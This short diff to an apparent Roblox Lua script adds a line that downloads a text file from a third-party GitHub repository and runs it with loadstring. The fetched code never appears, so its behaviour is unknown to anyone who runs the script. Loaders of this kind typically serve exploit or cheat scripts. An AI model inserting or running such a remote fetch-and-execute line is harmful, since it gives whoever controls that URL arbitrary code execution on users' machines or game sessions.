@@ -1,5 +1,5 @@
 
-local code = ""
+local code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/painyourstwo/synvextia/refs/heads/main/hhhh.txt"))()]]
 
 function missing(t, f, fallback)
     if type(f) == t then return f end
